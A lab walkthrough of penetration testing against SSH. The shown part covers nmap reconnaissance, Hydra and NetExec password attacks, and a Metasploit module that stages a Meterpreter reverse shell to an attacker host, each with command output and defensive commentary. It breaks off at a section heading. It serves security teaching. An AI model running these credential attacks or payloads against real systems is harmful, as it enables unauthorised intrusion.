# SSH Penetration Testing (Port 22): A Complete Lab Walkthrough

## Introduction

SSH, the Secure Shell, is one of the most widely deployed remote-access protocols in the world. It provides encrypted communication between a client and a server, which makes it the backbone of system administration, deployment pipelines and cloud infrastructure: whenever an engineer needs a shell on a machine that is not physically in front of them, SSH is almost certainly what carries the session. That ubiquity is exactly what makes it interesting from a security point of view. A hardened server often exposes nothing at all to the internet except SSH, so an assessment of that server frequently reduces to an assessment of one service — and if that one service falls, everything behind it falls with it.

This guide walks the complete penetration-testing lifecycle against an SSH service on a deliberately vulnerable lab machine. We begin with reconnaissance against the port, move through credential attacks against password authentication, gain interactive and Meterpreter access, then explore the less obvious capabilities that an authenticated SSH account quietly provides: file transfer, private-key theft and cracking, tunnelling into services that are bound to localhost, a raw reverse shell that bypasses SSH entirely, and finally a way to keep access after the original password stops working. Along the way each technique is paired with the defensive control that would have stopped it, because the two halves of that story only make sense together.

**Lab topology.** The exercises assume two virtual machines on an isolated host-only network. The target is an Ubuntu 22.04 LTS server running OpenSSH with password authentication enabled, and the attacker is a Debian-family security distribution (a Kali image is ideal) with the usual toolkit installed. The IP addresses used throughout are `192.168.1.9` for the target and `192.168.1.17` for the attacker.

| Role | Operating system | Address | Notes |
| --- | --- | --- | --- |
| Target | Ubuntu 22.04 LTS server | `192.168.1.9` | OpenSSH 8.9p1, password auth enabled, hostname `ubuntu-lab` |
| Attacker | Debian-based security distro | `192.168.1.17` | nmap, Hydra, NetExec, Metasploit, John the Ripper |
| Network | Host-only / NAT lab segment | `192.168.1.0/24` | No route to the internet from the lab |

> **Authorisation and scope.** Everything described here is an attack technique. Run it only on machines you own or for which you hold written authorisation — a purpose-built virtual lab is the right place to practise, and it is the only place these commands are safe. Password guessing, key theft, tunnelling and persistence are all clearly detectable, aggressive behaviours on a production network, and performing them without permission is a criminal offence in most jurisdictions. The defensive countermeasures are given alongside each technique precisely so that this material can also be read from the other side of the fight.

### How to read the transcripts

The terminal sessions in this guide follow the conventions of the shell itself, and a few of them are worth learning before the first command:

* A prompt ending in `#` means the shell is running as the root account (`root@kali:~#`), while a prompt ending in `$` means an ordinary user. Most of the attacker-side work happens as root because the tools need raw sockets; on the target, we deliberately show the perspective of the low-privileged account we have compromised.
* The transcript `pentest@ubuntu-lab:~$` is the target machine seen through an SSH session. Everything you would type there is typed over the encrypted channel, which is why the characters reach the server intact.
* Output shown here was captured on Debian-family systems and is representative rather than byte-identical: package versions, session port numbers, timestamps, MAC addresses and the number of wordlist entries will differ on your own lab. The structure of the output is what matters.
* When a command is long enough to be broken across two lines in the third-party tool documentation, it is always shown here as a single line you can paste.

### Table of contents

1. [Lab setup — installing the OpenSSH server](#1-lab-setup--installing-the-openssh-server)
2. [Reconnaissance — service enumeration with nmap](#2-reconnaissance--service-enumeration-with-nmap)
3. [Enumerating the authentication surface](#3-enumerating-the-authentication-surface)
4. [Credential attacks — Hydra and NetExec](#4-credential-attacks--hydra-and-netexec)
5. [Initial access — shell, remote commands and Meterpreter](#5-initial-access--shell-remote-commands-and-meterpreter)
6. [Changing the SSH listening port](#6-changing-the-ssh-listening-port)
7. [Key-based authentication and disabling passwords](#7-key-based-authentication-and-disabling-passwords)
8. [Cracking passphrase-protected private keys](#8-cracking-passphrase-protected-private-keys)
9. [Data exfiltration — SCP and NetExec file operations](#9-data-exfiltration--scp-and-netexec-file-operations)
10. [Post-exploitation — harvesting SSH credentials](#10-post-exploitation--harvesting-ssh-credentials)
11. [Local port forwarding — reaching internal services](#11-local-port-forwarding--reaching-internal-services)
12. [Reverse shell — pivoting out via bash TCP](#12-reverse-shell--pivoting-out-via-bash-tcp)
13. [Persistent access — key injection](#13-persistent-access--key-injection)
14. [Hardening summary](#14-hardening-summary)
15. [Quick reference cheat sheet](#15-quick-reference-cheat-sheet)
16. [Practice exercises](#16-practice-exercises)

---

## 1. Lab setup — installing the OpenSSH server

Before any testing can begin, the target has to actually be running the service we intend to attack. On a freshly provisioned Ubuntu server the client tools are usually present but the *server* is not, because Ubuntu's default installation does not expose a remote shell unless the administrator asks for one. Installing it is a single package operation performed from the APT package manager, and it is worth doing yourself at least once so that you know exactly what the "before" state of a target looks like.

```bash
pentest@ubuntu-lab:~$ sudo apt update
Hit:1 http://archive.ubuntu.com/ubuntu jammy InRelease
Hit:2 http://security.ubuntu.com/ubuntu jammy-security InRelease
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
All packages are up to date.
pentest@ubuntu-lab:~$ sudo apt install openssh-server
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  ncurses-term openssh-sftp-server ssh-import-id
Suggested packages:
  molly-guard monkeysphere ssh-askpass
The following NEW packages will be installed:
  ncurses-term openssh-server openssh-sftp-server ssh-import-id
0 upgraded, 4 newly installed, 0 to remove and 0 not upgraded.
Need to get 1,536 kB of archives.
After this operation, 4,300 kB of additional disk space will be used.
Do you want to continue? [Y/n] y
Get:1 http://archive.ubuntu.com/ubuntu jammy/main amd64 ncurses-term all 6.3-2 [481 kB]
Get:2 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 openssh-sftp-server amd64 1:8.9p1-3ubuntu0.10 [49.3 kB]
Get:3 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 openssh-server amd64 1:8.9p1-3ubuntu0.10 [425 kB]
Get:4 http://archive.ubuntu.com/ubuntu jammy/main amd64 ssh-import-id all 5.11-0ubuntu1 [7,878 B]
Fetched 1,536 kB in 2s (907 kB/s)
Preconfiguring packages ...
Selecting previously unselected package openssh-server.
Preparing to unpack .../openssh-server_1%3a8.9p1-3ubuntu0.10_amd64.deb ...
Unpacking openssh-server (1:8.9p1-3ubuntu0.10) ...
Setting up ncurses-term (6.3-2) ...
Setting up openssh-sftp-server (1:8.9p1-3ubuntu0.10) ...
Setting up openssh-server (1:8.9p1-3ubuntu0.10) ...
Created symlink /etc/systemd/system/sshd.service → /usr/lib/systemd/system/ssh.service.
Setting up ssh-import-id (5.11-0ubuntu1) ...
Processing triggers for man-db (2.10.2-1) ...
Processing triggers for ufw (0.36.1-8.1) ...
```

Four packages arrive in this transaction and each one exists for a reason worth understanding. `openssh-server` itself is the daemon, `sshd`, that listens for connections and spawns a session for each authenticated user. `openssh-sftp-server` provides the SFTP subsystem, which is the component that SCP, rsync-over-SSH and modern file-transfer GUIs actually use once a connection is established — without it, `scp` falls back to an older protocol and many graphical clients fail outright. `ncurses-term` adds terminal definitions for a wider range of `TERM` values, which prevents the garbled display you get when an unusual terminal type connects to a minimal system. `ssh-import-id` pulls public keys from a GitHub or Launchpad account so that an administrator can authorise a user without pasting a key by hand — a convenience feature that, as we will see in section 13, is exactly the kind of key-management shortcut that deserves attention during a review.

The last few lines of the transcript are also informative. The `Created symlink /etc/systemd/system/sshd.service` message is systemd's way of saying that the service is now enabled: it will start on boot, and it can be started, stopped and restarted with `systemctl`. Ubuntu's packaging starts the daemon immediately after installation, so the very next thing to confirm is that it really is listening, and on which socket:

```bash
pentest@ubuntu-lab:~$ systemctl status ssh --no-pager
● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)
     Active: active (running) since Thu 2024-01-11 09:52:41 UTC; 4min ago
       Docs: man:sshd(8)
             man:sshd_config(5)
   Main PID: 812 (sshd)
      Tasks: 1 (limit: 2261)
     Memory: 1.2M
        CPU: 12ms
     CGroup: /system.slice/ssh.service
             └─"sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"

Jan 11 09:52:41 ubuntu-lab systemd[1]: Starting OpenBSD Secure Shell server...
Jan 11 09:52:41 ubuntu-lab sshd[812]: Server listening on 0.0.0.0 port 22.
Jan 11 09:52:41 ubuntu-lab sshd[812]: Server listening on :: port 22.
Jan 11 09:52:41 ubuntu-lab systemd[1]: Started OpenBSD Secure Shell server.
pentest@ubuntu-lab:~$ ss -tlnp | grep sshd
LISTEN 0      128          0.0.0.0:22        0.0.0.0:*    users:(("sshd",pid=812,fd=3))
LISTEN 0      128             [::]:22           [::]:*    users:(("sshd",pid=812,fd=4))
```

Two details in that output drive the rest of this walkthrough. First, the daemon is bound to `0.0.0.0:22` and `[::]:22`, which means it accepts connections on every network interface of the machine — if that machine has a public address, the whole world can reach port 22. Second, the configuration in force is the *vendor default*, and the Ubuntu default for a freshly installed `openssh-server` permits password authentication for local accounts. That single setting is the weakness this lab is built around: because a password can be typed by a human, it can also be guessed by a machine.

The packaging also leaves an audit trail on disk that is useful to know about from both sides of the fence. `/etc/ssh/sshd_config` is the server configuration, `/etc/ssh/ssh_config` is the client configuration, the host keys live in `/etc/ssh/ssh_host_*_key`, and the per-user trust file is `~/.ssh/authorized_keys`. Authentication events are logged to `/var/log/auth.log` on Ubuntu (or to the systemd journal, where `journalctl -u ssh` will show them), which is where a defender would look for the brute-force attempts we are about to generate.

---

## 2. Reconnaissance — service enumeration with nmap

Reconnaissance is the first phase of any engagement. Before attempting to exploit a service you must confirm that it is running, identify its exact version, and map out the ways in which it will let you authenticate. Version information matters because every implementation carries a release history: knowing that a target runs `OpenSSH 8.9p1` on Ubuntu 22.04 tells you which default configuration applies, which known issues exist, and — more practically for this lab — that the operating system is a modern Ubuntu where the default `sshd_config` allows passwords.

The scan itself is a single nmap invocation. The `-sV` flag turns on version detection, which makes nmap perform a set of protocol-specific probes rather than simply reporting that a port is open. The `-p 22` flag narrows the scan to the SSH port so that the output stays short during reconnaissance; in a real engagement you would follow up with a full-range scan (`-p-`) afterwards, because a service that has been moved to an unusual port will not appear here at all.

```bash
root@kali:~# nmap -sV -p 22 192.168.1.9
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-11 10:02 UTC
Nmap scan report for 192.168.1.9
Host is up (0.00055s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
MAC Address: 00:0C:29:1B:2C:3D (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
```

Read the output line by line, because every field is a fact you can act on. The first line tells you when the scan ran and which version of nmap produced it, which matters when you have to reproduce a result later. `Nmap scan report for 192.168.1.9` is followed by `Host is up (0.00055s latency)` — a sub-millisecond round trip, which is the signature of a target on the same local segment or the same hypervisor rather than something across the internet; latency that low is a useful clue that the machine is a lab VM and not a routed production host.

The interesting line is the port itself. `22/tcp open ssh` confirms that the daemon is listening and that nmap was able to complete a TCP handshake, and the version column carries two separate pieces of information. `OpenSSH 8.9p1` is the upstream release, while `Ubuntu 3ubuntu0.10` is Ubuntu's package revision; the combination identifies the operating system with high confidence, and nmap repeats that conclusion in the `Service Info` line with `OS: Linux` and a CPE string you can feed into a vulnerability database. `protocol 2.0` confirms the modern SSH protocol version, which means the ancient protocol-1 weaknesses are irrelevant here — the attack surface is not the cryptography but the authentication policy.

The MAC address is worth a sentence of its own because it appears in so many reports. `00:0C:29:1B:2C:3D` is an Ethernet hardware address, and the first three bytes are the vendor prefix: `00:0C:29` is assigned to VMware, so the target is a virtual machine on a VMware platform. A defender seeing this in an asset inventory knows the host is virtual and can find it through the hypervisor; a tester notes that the network path probably includes no physical switch filtering and that the environment is disposable. If the scan had been made across a routed network the MAC line would be absent entirely, since MAC addresses do not survive routing.

Finally, note what the scan did *not* tell us. It did not tell us which users exist, whether passwords are enabled, or how the daemon responds to authentication attempts. The banner alone is not enough to plan the credential attacks that follow, so the next step is to interrogate the authentication layer directly with an nmap script.

---

## 3. Enumerating the authentication surface

Knowing that SSH is running tells you nothing about *how* it will let you in, and that is the question that determines which attack makes sense. SSH supports several authentication mechanisms — password, public key, keyboard-interactive, GSSAPI, host-based — and a server advertises the ones it is willing to accept during the early phase of a connection, before any credential is sent. That advertisement can be read without an account, which makes it excellent reconnaissance.

The `ssh-auth-methods` nmap script does exactly this, and it takes a username because some servers vary their answer depending on whether the account exists (a behaviour worth noting in itself: when a server responds differently for valid and invalid users, it is leaking account validity). Passing `ssh.user=pentest` makes the script ask about the account we are interested in.

```bash
root@kali:~# nmap --script ssh-auth-methods --script-args="ssh.user=pentest" -p 22 192.168.1.9
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-11 10:04 UTC
Nmap scan report for 192.168.1.9
Host is up (0.00049s latency).

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
| ssh-auth-methods:
|   Supported authentication methods:
|     publickey
|     password
|_  Banner: SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10

Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
```

Two methods are offered. `publickey` is the strong one and it is effectively unbreakable from the outside: the client proves possession of a private key without ever transmitting it, and there is nothing for an offline attacker to guess. `password` is the weak one in this context, because a password is a shared secret that a human chose, and any secret a human chose can be guessed by a machine. The `Banner:` line simply echoes the SSH identification string the server sends first — the same string we already read from the version scan, which is a convenient confirmation that the two observations describe the same daemon.

This single script run is what justifies the entire next section. If the output had shown only `publickey`, the correct conclusion would have been "there is no password to brute-force here, move on to attacking the key material or the rest of the host" — a five-second observation that saves hours of pointless hammering and, just as importantly, keeps you out of the logs of a system you cannot actually break. Because the output shows `password`, a dictionary attack is a legitimate and likely productive avenue.

The same script is the natural verification tool for the hardening work in section 7, and it is worth noticing how the two runs differ: once password authentication is disabled, the `password` line disappears and only `publickey` remains. Being able to demonstrate that change with an independent tool, rather than with the configuration file the administrator swears they edited, is exactly the kind of evidence an assessment report needs.

---

## 4. Credential attacks — Hydra and NetExec

Password authentication is enabled, so the next question is whether the passwords in use are any good. Two complementary techniques answer it. A *dictionary attack* tries many passwords against a small number of known accounts, and is effective when the password itself appears in a well-known wordlist. A *password spray* tries a small number of common passwords against many accounts, and is effective when the same weak password has been reused across the organisation — and it is much stealthier, because it avoids the account-lockout and rate-limit triggers that a flood of guesses against one account will set off.

Both techniques need input files. In a real engagement these would come from earlier reconnaissance: usernames harvested from a web application, a leaked employee list, or the output of `enum4linux` against a file server; passwords from previous breach corpora. In the lab, a handful of entries is enough to demonstrate the mechanic.

```bash
root@kali:~# cat users.txt
admin
root
pentest
ubuntu
root@kali:~# cat pass.txt
123
password
Password1
admin
ubuntu
letmein
root@kali:~# wc -l users.txt pass.txt
4 users.txt
6 pass.txt
```

### 4.1 Dictionary attack with Hydra

Hydra is a parallelised online password-guessing tool that speaks dozens of protocols, and its SSH module is one of the most commonly used. The invocation has three parts: `-L users.txt` supplies the list of *logins*, `-P pass.txt` supplies the list of *passwords*, and the trailing `ssh` selects the protocol module, which tells Hydra how to speak SSH and which port to use by default.

```bash
root@kali:~# hydra -L users.txt -P pass.txt 192.168.1.9 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-11 10:07:12
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28 login tries (l:4/p:7), ~2 tries per task
[DATA] attacking ssh://192.168.1.9:22/
[22][ssh] host: 192.168.1.9   login: pentest   password: 123
[STATUS] attack finished for 192.168.1.9 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-11 10:07:14
```

The banner is Hydra's standard greeting and version stamp. The two `[DATA]` lines describe the attack before it starts, and they are the most useful lines for an operator: `28 login tries (l:4/p:7)` is the size of the search space — four logins multiplied by seven passwords — and `~2 tries per task` explains how that space is divided among the parallel workers. Hydra is fast because it opens several SSH connections at once, so a real-world run against a large wordlist produces thousands of authentication attempts per minute; that speed is also what makes it loud, and any host with `fail2ban` or a properly configured rate limit will block the source address long before the list is exhausted.

The success line deserves to be read carefully, because it is the single most important line in the whole engagement so far: `[22][ssh] host: 192.168.1.9   login: pentest   password: 123`. The credentials are `pentest` / `123`, which is a password that appears in every breach corpus ever published and would be guessed by any attacker within seconds. The `[STATUS] attack finished ... (valid pair found)` line confirms that Hydra stopped early — the default behaviour is to exit once it has found something, rather than burning through the rest of the wordlist, which keeps the attack as short as possible.

A few flags change the shape of the attack and are worth knowing. `-t 4` sets the number of parallel tasks, and lowering it from the default of 16 is the standard way to stay under a rate limit and out of an intrusion-detection alert. `-s 2222` changes the target port, which becomes necessary later in this walkthrough once the service is moved. `-f` stops after the first valid pair for each host and `-F` stops at the first success anywhere, while `-o found.txt` writes the results to a file so that the report does not depend on scrollback. `-e nsr` additionally tries an empty password and the login name reversed, which are worth including in any real assessment because they are surprisingly common on service accounts.

Finally, a caution that belongs in any discussion of online guessing. Hydra's default behaviour can lock out accounts, fill log files, and trigger alarms on the target; on a production system, an unannounced brute-force run is an availability risk, not just a visibility risk. In an authorised engagement, agree the rate limits and the accounts in scope with the client first, keep the thread count low, and prefer a sprayed list of a few likely passwords over thousands of guesses against a single account.

### 4.2 Password spraying with NetExec

Hydra answered the question "does this account have a weak password?" NetExec answers a different and often more valuable question: "have any of these accounts reused *the same* weak password?" The distinction matters because spraying spreads a small number of attempts across many accounts, so no individual account accumulates enough failures to trip a lockout threshold or a per-account alarm.

```bash
root@kali:~# nxc ssh 192.168.1.9 -u users.txt -p 123
[*] SSH         192.168.1.9    22     192.168.1.9     SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
[-] SSH         192.168.1.9    22     192.168.1.9     admin:123
[-] SSH         192.168.1.9    22     192.168.1.9     root:123
[+] SSH         192.168.1.9    22     192.168.1.9     pentest:123
[*] SSH         192.168.1.9    22     192.168.1.9     User: 'pentest' matched keyword: (sudo)
[*] SSH         192.168.1.9    22     192.168.1.9     Current user: 'pentest' was in 'sudo' group, please try '--sudo-check' to check if user can run sudo shell
```

The output format is worth decoding because NetExec is used throughout the rest of this guide. Every line begins with a status marker in brackets: `[*]` for informational output, `[+]` for a success, `[-]` for a failure, and `[!]` for a warning. Next comes the protocol (`SSH`), then the target address, the port and the resolved hostname, and only then the payload of the message. This fixed layout is what makes the tool pleasant to use against ranges of hosts — you can scan a column with your eye instead of reading prose.

Three logins were rejected for the password `123` and one was accepted: `pentest`. Note how much quieter this is than the Hydra run. Four attempts in total is almost invisible in an authentication log, whereas the dictionary attack generated twenty-eight. On a larger engagement the spray list would contain five or six of the most common enterprise passwords rather than one, and the username list would contain every account discovered during reconnaissance — a technique that historically succeeds more often than brute force, because password *reuse* across accounts is far more common than genuinely terrible individual passwords.

The two trailing lines are the most operationally significant, and they are easy to skim past. NetExec logs in with the recovered credentials and runs a short privilege check, and the reply `User: 'pentest' matched keyword: (sudo)` means the account is a member of the `sudo` group. NetExec distinguishes between "this user is root" and "this user is in the sudo group": the former is reported as a compromised host with the `(Pwn3d!)` marker, while the latter produces the tip you see in the transcript, suggesting the `--sudo-check` flag to test whether the account can actually run `sudo`. NetExec is being careful here, and the caution is well placed: membership of the `sudo` group does not by itself prove that the user may run arbitrary commands, because a `sudoers` policy can restrict both the commands and whether a password is required.

In this lab the distinction is academic, because `pentest` is a full administrator with a passwordless sudo rule. That is worth confirming by hand once you have an interactive session, and the confirmation is a two-command affair:

```bash
pentest@ubuntu-lab:~$ id
uid=1001(pentest) gid=1001(pentest) groups=1001(pentest),27(sudo)
pentest@ubuntu-lab:~$ sudo -ln
Matching Defaults entries for pentest on ubuntu-lab:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User pentest may run the following commands on ubuntu-lab:
    (ALL : ALL) ALL
```

`id` shows the supplementary group `27(sudo)`, and `sudo -ln` lists what the account may run: `(ALL : ALL) ALL` means every command as every user, with no password required. The moment this output appears, the engagement is effectively over as far as privilege escalation is concerned — there is nothing left to escalate, because the compromised account already has root. This is the reason the spray was worth running even though Hydra had already found a password: the value was not the credential, it was the discovery that the credential belongs to an administrator.

---

## 5. Initial access — shell, remote commands and Meterpreter

With `pentest` and `123` in hand there are several ways onto the machine, and they are not interchangeable. An interactive SSH session is what a human administrator uses; a single remote command is what a script uses; and a Meterpreter session is what a post-exploitation framework uses when it wants a whole toolkit on the far end. This section demonstrates all three, and the order matters: the plainest method first, so that the added capabilities of each subsequent method are obvious.

### 5.1 Direct SSH login

The simplest thing that works is the SSH client itself, which is already installed on the attacker machine. The syntax is `ssh <user>@<host>`, and the very first connection to a new host produces a prompt about the host key that every beginner eventually has to understand.

```bash
root@kali:~# ssh pentest@192.168.1.9
The authenticity of host '192.168.1.9 (192.168.1.9)' can't be established.
ED25519 key fingerprint is SHA256:9xQ2rTgZ7mK1pRcVq4Yd1sB3nE6jWfH8aLoX0uMiPn.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.9' (ED25519) to the list of known hosts.
pentest@192.168.1.9's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Jan 11 10:09:31 UTC 2024

  System load:  0.0               Processes:             108
  Usage of /:   31.4% of 23.31GB  Users logged in:       0
  Memory usage: 12%               IPv4 address for eth0: 192.168.1.9
  Swap usage:   0%                IPv6 address for eth0: fe80::20c:29ff:fe1b:2c3d

Last login: Thu Jan 11 09:58:02 2024 from 192.168.1.9
pentest@ubuntu-lab:~$ id
uid=1001(pentest) gid=1001(pentest) groups=1001(pentest),27(sudo)
```

The host-key prompt is the client's protection against man-in-the-middle attacks, and it is worth understanding rather than clicking through. On first contact the client has never seen the server's public host key, so it can only print the key's fingerprint and ask whether you trust it. In a lab where you built both machines, answering `yes` is correct. On an engagement, the right answer is to verify the fingerprint out of band — by asking the client for its known-good value — because accepting whatever key you are offered is exactly the behaviour an SSH interception depends on. Once accepted, the key is stored in `~/.ssh/known_hosts` and every later connection is checked against it; if the key ever changes, the client refuses to connect and warns loudly, which is the behaviour that should make you stop and investigate rather than delete the entry. (The classic error message in that situation begins with `WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!`)

After the fingerprint prompt comes the password prompt — the characters you type are not echoed, which is normal — and then the server's login banner. Ubuntu prints a message-of-the-day block containing the release version, a summary of system load, disk and memory usage, and the interfaces' addresses. From an assessment point of view that banner is a gift: it confirms the operating system version (`22.04.3 LTS`), the kernel (`5.15.0-91-generic`) and the machine's primary address, all without running a single command. From a hardening point of view it is a small information leak, which is why many production servers strip it out or replace it with a legal notice.

The prompt that follows, `pentest@ubuntu-lab:~$`, shows the user, the hostname and the current directory, and the `$` confirms we are an ordinary user rather than root. Running `id` confirms the group membership we already suspected from NetExec: `groups=1001(pentest),27(sudo)`. The value of this session is that it is *interactive*: a full pseudo-terminal, job control, an editor, and the ability to run anything the toolchain provides. Everything in the rest of this guide can be executed from here.

### 5.2 Running single commands over SSH

Not every task needs an interactive session. The SSH client can execute one command on the remote host and return its output, which is exactly what you want inside a loop or a script. Anything appended after the host is passed to the remote shell as a command string.

```bash
root@kali:~# ssh pentest@192.168.1.9 'ifconfig'
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.9  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::20c:29ff:fe1b:2c3d  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:1b:2c:3d  txqueuelen 1000  (Ethernet)
        RX packets 8421  bytes 731942 (731.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3902  bytes 512334 (512.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loopback  txqueuelen 1000  (Local Loopback)
```

The command itself is unremarkable — `ifconfig` prints the interface configuration, and the output confirms the machine's address and the VMware MAC prefix we saw during reconnaissance. What matters is the *mechanism*, because it has consequences. The remote command runs in a non-interactive shell: there is no pseudo-terminal unless you ask for one with `-t`, which means programs that expect a TTY (some interactive commands, `sudo` in certain configurations, anything that pages its output) will behave differently or fail outright. Standard output and standard error are forwarded back over the encrypted channel, and the exit status of the remote command becomes the exit status of the local `ssh` process, which is what makes the construct usable in scripts: `ssh host 'test -f /etc/shadow' && echo present` works exactly as you would hope.

The quoting rules are the part beginners get wrong. `ssh host 'cmd'` sends the literal string to the remote shell, so `$VAR`, backticks and globs are expanded *remotely*; `ssh host "cmd"` lets your local shell expand them first. When a remote command needs to run as a different user, `sudo` on the far end usually needs `-t` to allocate a terminal, giving `ssh -t pentest@192.168.1.9 'sudo -i'`. And when you need an actual interactive session with a terminal, that is what plain `ssh host` already provides.

The same idea is available without the SSH client at all, through NetExec's `-x` flag, which logs in over SSH, executes the command and prints the output inline. This is handy for quickly triaging a host or for scripting across many hosts, because the authentication details are passed as arguments rather than typed at a prompt.

```bash
root@kali:~# nxc ssh 192.168.1.9 -u pentest -p 123 -x 'cat /tmp/file.txt'
[*] SSH         192.168.1.9    22     192.168.1.9     SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
[+] SSH         192.168.1.9    22     192.168.1.9     pentest:123
[+] SSH         192.168.1.9    22     192.168.1.9     Executed command
[*] SSH         192.168.1.9    22     192.168.1.9     Reminder: change the backup schedule before the audit
```

The transcript shows the three-step rhythm of every NetExec command execution: an informational line announcing the server banner, a success marker for the authentication itself, and then `Executed command` followed by the command's output printed line by line under `[*]` markers. Because authentication is re-established for each invocation, this style is ideal for a quick, non-interactive sweep of a host — reading a configuration file, checking a version, listing a directory, or transferring a file — the last of which section 9 develops into a full exfiltration technique.

### 5.3 Meterpreter over SSH with `exploit/multi/ssh/sshexec`

An interactive shell is enough for most of what follows, but it has limits. It is noisy in the sense that a shell process is visible to any user who runs `w` or `who`, it depends on the remote machine's own tools, and it does not survive a network hiccup. Metasploit's `exploit/multi/ssh/sshexec` module takes a different approach: it authenticates over SSH like a normal client, then uses that authenticated channel to *stage and execute a payload*, giving you a Meterpreter session — a rich post-exploitation environment that lives in memory and provides its own commands for file transfer, process manipulation, credential harvesting and pivoting.

```bash
root@kali:~# msfconsole -q
msf6 > use exploit/multi/ssh/sshexec
[*] No payload configured, defaulting to cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(multi/ssh/sshexec) > set rhosts 192.168.1.9
rhosts => 192.168.1.9
msf6 exploit(multi/ssh/sshexec) > set username pentest
username => pentest
msf6 exploit(multi/ssh/sshexec) > set password 123
password => 123
msf6 exploit(multi/ssh/sshexec) > set target 1
target => 1
msf6 exploit(multi/ssh/sshexec) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/ssh/sshexec) > set lhost 192.168.1.17
lhost => 192.168.1.17
msf6 exploit(multi/ssh/sshexec) > run

[*] Started reverse TCP handler on 192.168.1.17:4444 
[*] 192.168.1.9:22 - Sending stager...
[*] Command Stager progress -  12.21% done (61/500 bytes)
[*] Command Stager progress -  24.42% done (122/500 bytes)
[*] Command Stager progress -  48.84% done (244/500 bytes)
[*] Command Stager progress - 100.00% done (500/500 bytes)
[*] Sending stage (1017704 bytes) to 192.168.1.9
[*] Meterpreter session 1 opened (192.168.1.17:4444 -> 192.168.1.9:49328) at 2024-01-11 10:14:52 +0000

meterpreter > getuid
Server username: pentest
meterpreter > sysinfo
Computer     : ubuntu-lab
OS           : Ubuntu 22.04 (Linux 5.15.0-91-generic)
Architecture : x86_64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
```

Working through the setup first: `rhosts`, `username` and `password` are the same three facts we already recovered, and `lhost` is the attacker address the payload should call home to. The two settings that need explanation are `target` and `payload`. The module's target list starts at index 0 with `Linux Command` — a mode that runs a single shell command and is useful with a command payload — followed by native architectures: index 1 is `Linux x86`, index 2 is `Linux x64`, and further entries cover ARM, MIPS, macOS, BSD and Python. Setting `target 1` selects the 32-bit x86 Linux target, which is what makes `linux/x86/meterpreter/reverse_tcp` an appropriate payload; on a 64-bit target you could equally use `target 2` with the x64 payload. The important habit is that the payload architecture must match the chosen target, because Metasploit will refuse an incompatible pair.

The run output has a rhythm that repeats for every staged exploit. `Started reverse TCP handler` confirms that the attacker is listening for the connection the payload will make. `Sending stager...` is the module's own message telling you that it has logged in and is now delivering the first-stage payload file. The `Command Stager progress` lines are the module writing that payload to the target in chunks over the authenticated SSH channel, using shell commands to reassemble the pieces — this is why the target's `tmp` directory can fill up during a failed exploit, and why a defender who watches for large shell command sequences sees an obvious anomaly. `Sending stage (1017704 bytes)` is the actual Meterpreter payload going over the new connection, and `Meterpreter session 1 opened` is the finish line, complete with the ephemeral source port the target used.

Meterpreter's advantages become clear the moment you have one. `getuid` reports the account the payload is running as, and `sysinfo` gives the operating system, kernel, architecture and payload type without touching the target's own tools. From there the whole post-exploitation toolkit is available: `upload` and `download` for file transfer, `ps` and `migrate` for process manipulation, `hashdump` where privileges allow, `portfwd` for tunnelling, and hundreds of extension commands. Every one of those actions happens over the session's channel and can be automated by a post-exploitation module, which is exactly what section 10 takes advantage of.

It is worth being clear about the trade-offs. Meterpreter is a memory-resident, signature-rich artifact: endpoint detection products are specifically built to notice its stagers and its network patterns, and the `Command Stager` chatter in an authentication log is conspicuous. A plain SSH session, by contrast, looks like an administrator working — which is why the rest of this guide mostly uses SSH itself and reserves Meterpreter for the automation it does best.

---

## 6. Changing the SSH listening port

